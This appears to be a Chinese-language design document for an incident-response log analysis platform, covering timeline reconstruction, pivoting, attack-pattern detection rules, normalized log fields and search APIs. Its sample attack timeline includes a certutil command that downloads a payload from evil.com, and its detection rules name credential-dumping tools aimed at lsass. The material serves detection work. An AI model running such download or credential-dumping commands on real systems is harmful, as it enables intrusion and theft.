# 日志分析中心 — 应急专家设计方案

> **设计者视角**：一线应急响应专家  
> **核心原则**：时间线优先 · 一键跳转 · 模式识别 · 上下文为王

---

## 一、应急日志分析的 5 个核心需求

### 1.1 时间线重建（第 0 步）

应急响应永远从"告诉我什么时间发生了什么"开始。日志分析中心的第一屏必须是**时间线**，不是表格。

```
时间线就是 UI 的核心范式，不是附属品
```

### 1.2 一键跳转（Pivot）

发现一个可疑 IP 192.168.1.200 后，最自然的下一个动作是：**"这个 IP 还干了什么？"**

```
点击 IP → 立即筛选该 IP 所有事件     < 0.5 秒
点击用户 → 立即查看该用户所有操作     < 0.5 秒
点击进程 → 立即查看该进程所有活动     < 0.5 秒
```

### 1.3 模式识别（不是原始数据）

```
原始数据：  4625 | 4625 | 4625 | 4625 | 4625 | 4625 | 4624
模式识别：  🔴 暴破攻击 — 6 次失败后 1 次成功（admin@192.168.1.200）
```

系统应该自动做这个聚合，而不是让分析师数行数。

### 1.4 上下文感知（不做断章取义）

```
❌ 只见树木：  powershell.exe -enc ...
✅ 见林见木：  winword.exe (PID 1000) → cmd.exe (PID 2000) → powershell.exe (PID 3000)
              父子链完整，一眼看出是钓鱼文档宏执行
```

每条日志必须携带**父进程**和**会话上下文**。

### 1.5 会话重建（复原攻击者行为链）

同一个 `Logon Session ID` 下的所有事件按时间排序 = 攻击者从登录到离开的完整操作记录。

```
Logon Session 0x3E7（2026-07-12 08:45 - 09:35）
  │  08:45   4672  管理员登录（来源: 192.168.1.200）
  │  08:47   4688  计划任务创建 (schtasks.exe)
  │  08:50   4688  certutil.exe -urlcache -split http://evil.com/payload.exe
  │  08:52   4688  payload.exe 执行
  │  08:55   5156  外连 203.0.113.42:443
  │  09:20   1102  🚨 审计日志清除 — 攻击者收尾
```

## 二、架构设计

### 2.1 数据流

```
Agent JSON 导入
  │
  ├── logs.system[]
  ├── logs.security[]
  ├── logs.application[]
  └── logs.syslog[]
       │
       ▼
  LogNormalizer.normalize()
       │
       ├── Windows Event: Event ID → 事件类型 + MITRE + 严重度
       │                  ╰→ 提取用户/IP/进程/命令行/会话ID
       │
       ├── Linux syslog:  正则 → 事件类型
       │                  ╰→ 提取用户/IP/进程
       │
       ├── 自动标签: 命令行关键词 → 安全标签（PS编码/certutil下载/...）
       │
       ├── 模式识别: 时间窗口 + event_id 聚合 → 攻击模式标记
       │
       └── 去重:      5 秒内同主机同事件 → 合并（防重复采集）
            │
            ▼
       normalized_logs 表（每条日志一个字段都不少）
            │
            ▼
       API 层 → 前端 / 告警引擎 / 关联分析
```

### 2.2 范式化字段（逐条含义说明）

```python
{
    # ── 定位字段 ──
    "id": 1,                      # 主键
    "host_id": 5,                 # 主机 ID（关联 hosts 表）
    "hostname": "WEB-SRV-01",     # 主机名（冗余，避免频繁 JOIN）

    # ── 时间字段 ──
    "timestamp": "2026-07-12T09:30:00Z",  # ISO 8601，唯一时间基准
    "log_source": "security",             # system | security | application | syslog

    # ── 事件标识 ──
    "event_id": 4688,             # Windows Event ID（Linux=0）
    "event_type": "process_creation",     # 范式化事件类型
    "event_label": "进程创建",            # 中文标签
    "mitre_attack": "T1059.001",         # MITRE ATT&CK 编号
    "severity": "high",                  # critical | high | medium | low | info

    # ── 关键关联字段（全部支持点击跳转）──
    "source_ip": "192.168.1.200",
    "source_hostname": "",
    "target_ip": "",
    "target_hostname": "",
    "user_name": "admin",
    "user_domain": "WORKGROUP",
    "logon_session": "0x3E7",      # ⭐ 会话重建关键

    # ── 进程上下文（信息完备，不做断章取义）──
    "process_name": "powershell.exe",
    "process_pid": 1234,
    "parent_process_name": "explorer.exe",
    "parent_process_pid": 888,
    "command_line": "powershell -enc SQBFAFgA...",
    "object_name": "C:\\Users\\Public\\a.exe",   # 操作对象（文件/注册表/服务名）

    # ── 安全标签（自动标注）──
    "tags": ["powershell_encoded", "lolbin"],

    # ── 原始数据 ──
    "description": "新进程已创建。\n进程 ID: 1234\n...",
}
```

## 四、攻击模式识别（核心价值）

原始日志是噪音，模式才是情报。系统自动识别以下攻击模式：

### 模式 1：暴破攻击 🔑

```
条件：同一来源 IP + event_id=4625 × ≥10 次 + 时间窗口 ≤ 5 分钟
输出：暴破告警 + 来源 IP + 目标用户列表 + 是否成功（附近有 4624）
前端表现：自动聚合为一条"暴破攻击"记录，不再显示 50 条 4625
```

### 模式 2：审计日志清除 🚨

```
条件：event_id=1102
输出：critical 告警（不聚合，每次清除都是独立事件）
特殊处理：自动创建 alert，推送到告警中心
```

### 模式 3：下载执行链 📥→⚙️

```
条件：同一主机 + 5 分钟内先后出现 certutil 下载 + 新 .exe 执行
输出："下载执行链"标签 + 关联两条日志
```

### 模式 4：横向移动 🔄

```
条件：主机 A 上 4672(管理员登录) → 同一用户出现在主机 B 上
输出："横向移动"标签
```

### 模式 5：凭据窃取 🎯

```
条件：命令行含 mimikatz/procdump/comsvcs + MiniDump + lsass
输出：critical 告警，自动关联攻击链
```

## 五、API 设计

### 5.1 核心检索

```
GET /api/logs/search
  ?host_id=5
  &event_id=4625
  &event_type=process_creation
  &severity=critical,high
  &source_ip=192.168.1.200
  &user_name=admin
  &process_name=powershell.exe
  &keyword=SQBFAFgA                    # 全文搜索
  &date_from=2026-07-12T08:00:00Z
  &date_to=2026-07-12T10:00:00Z
  &logon_session=0x3E7                 # ⭐ 会话重建
  &tag=powershell_encoded              # 安全标签
  &sort=timestamp:desc
  &page=1
  &page_size=50
```

### 5.2 攻击模式（应急核心）

```
GET /api/logs/patterns/brute-force
  ?host_id=5
  &min_attempts=10                     # 最少尝试次数
  &window_minutes=5                    # 时间窗口
  → [{source_ip, target_user, attempts, success, first_seen, last_seen, ...}]

GET /api/logs/patterns/download-exec
  ?host_id=5
  → [{download_event, exec_event, time_diff, ...}]

GET /api/logs/pivot
  ?field=source_ip
  &value=192.168.1.200
  → [{event_type, count, first_seen, last_seen, ...}]   # 聚合结果，非原始数据

GET /api/logs/session/{logon_session}
  → [{event_type, timestamp, ...}]     # 该会话全部事件，按时间排序
```

### 5.3 统计

```
GET /api/logs/stats/summary
  ?host_id=5
  → {total, by_severity:{}, by_type:{}, top_ips:[], top_users:[], ...}

GET /api/logs/stats/timeline
  ?interval=hour
  &date_from=...
  &date_to=...
  → [{bucket, critical, high, medium, total}]
```

## 七、应急场景走查

### 场景：某主机告警"异常外连"

```
1. 打开日志分析中心
   → 顶部 KPI 显示: 严重事件 12 条
   → 时间线看到 09:20 附近有红色柱子

2. 点击"暴破分析"视图
   → 自动聚合 4625，看到 192.168.1.200 尝试 23 次
   → 最后一次成功后紧跟着 4672（管理员登录）

3. 点击管理员登录的详情
   → 看到来源 IP 192.168.1.200，Logon Session 0x3E7

4. 点击 Logon Session 0x3E7
   → 时间线重建: 08:45 登录 → 08:47 计划任务 → 08:50 certutil
   → 08:52 payload.exe → 08:55 外连 203.0.113.42:443

5. 点击 203.0.113.42
   → 该 IP 还出现在主机 B、C 上
   → 确定是横向移动 + C2 通信

6. 选中全部可疑事件 → 导出 → 附加到案件报告

耗时: < 3 分钟完成完整攻击链还原
```
